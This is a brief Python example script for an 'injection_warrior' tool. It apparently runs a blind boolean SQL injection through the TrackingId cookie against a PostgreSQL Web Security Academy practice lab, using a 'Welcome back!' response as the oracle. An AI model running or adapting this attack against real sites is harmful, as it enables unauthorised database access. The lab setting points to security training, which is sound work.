from injection_warrior import sqli_blind
from injection_warrior import warrior

import os
import sys
import json

            # values = self._parse_template(payloads=payloads, delimiter=delimiter, comment=comment, quote=quote,  comma=comma,
            #                               oracle=oracle, nulls=nulls, table_name=table_name, column_name_1=column_name_1, column_name_2=column_name_2)

script_dir = os.path.dirname(__file__) #<-- absolute dir the script is in
rel_path = "injection_warrior/payloads.json"
abs_file_path = os.path.join(script_dir, rel_path)
f_payloads = open(abs_file_path.replace('/examples', ''), 'r')
sqli_payloads = json.load(f_payloads)

blind_boolean_db_payloads = sqli_payloads.get('sqli').get('database_content').get('version_detection').get('blind_boolean').get('postgreSQL')
url = "https://ac331f3c1ea435dd802709c6009a00f4.web-security-academy.net"
blind_sqli_obj = sqli_blind.SQLiBlind(debug=True)

data = blind_sqli_obj.inject_payload(
    url=url,
    search_string="Welcome back!", 
    cookie_params={"TrackingId": "%$%"},
    injection_point="cookie",
    delimiter=' ',
    iterations =3,
    payloads = [blind_boolean_db_payloads],
    comma="%2c",
    resp_body=False,
    quote="'",
    html=True,
)
print(data)